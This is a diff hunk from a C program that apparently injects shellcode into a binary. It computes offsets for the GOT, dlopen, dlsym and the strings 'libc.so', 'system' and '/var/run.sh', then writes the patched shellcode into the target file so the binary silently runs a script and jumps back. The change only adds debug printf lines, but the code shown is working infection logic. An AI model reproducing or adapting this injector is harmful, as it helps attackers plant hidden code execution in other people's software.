@@ -345,33 +345,38 @@ int main(int argc,char *argv[])
     // compute got table entry address
     tmp_addr = got_addr - insert_caddr - 25 + 1;
     memcpy(shellcode2+27,&tmp_addr,sizeof(tmp_addr));
-    printf("RVA of got address is 0x%x\n",tmp_addr);
+    printf("RVA of .got is 0x%x\n",tmp_addr);
 
     // compute the address of 'libc.so' 
     tmp_addr = 105 - 36 + 12;
     memcpy(shellcode2+38,&tmp_addr,sizeof(tmp_addr));
-    printf("RVA of string 'libc.so' address is 0x%x\n",tmp_addr);
+    printf("RVA of string 'libc.so' is 0x%x\n",tmp_addr);
 
     // compute the entry address of dlopen function
     tmp_addr = dop_addr - insert_caddr - 43 - 5;
     memcpy(shellcode2+44,&tmp_addr,sizeof(tmp_addr));
-
+    printf("RVA of dlopen function is 0x%x\n",tmp_addr);
+    
     // compute the address of 'system'
     tmp_addr = 123 - 60 + 4;
     memcpy(shellcode2+62,&tmp_addr,sizeof(tmp_addr));
+    printf("RVA of string 'system' is 0x%x\n",tmp_addr);
   
     // compute the entry address of dlsym function
     tmp_addr = dsm_addr - insert_caddr - 68 - 5;
     memcpy(shellcode2+69,&tmp_addr,sizeof(tmp_addr));
+    printf("RVA of dlsym function is 0x%x\n",tmp_addr);
 
     // compute the address of '/var/run.sh' 
     tmp_addr = 129 - 85 + 5;
     memcpy(shellcode2+87,&tmp_addr,sizeof(tmp_addr));
+    printf("RVA of string '/var/run.sh' is 0x%x\n",tmp_addr);
 
     // compute the jump-back address
     tmp_addr = dll_addr + 7 - insert_caddr - 100 - 5;
     printf("%x\n",tmp_addr);
     memcpy(shellcode2+101,&tmp_addr,sizeof(tmp_addr));
+    printf("RVA of jump-back address is 0x%x\n",tmp_addr);
 
     fseek(fd,dll_addr,SEEK_SET);
     fwrite(shellcode1,sizeof(shellcode1),1,fd);
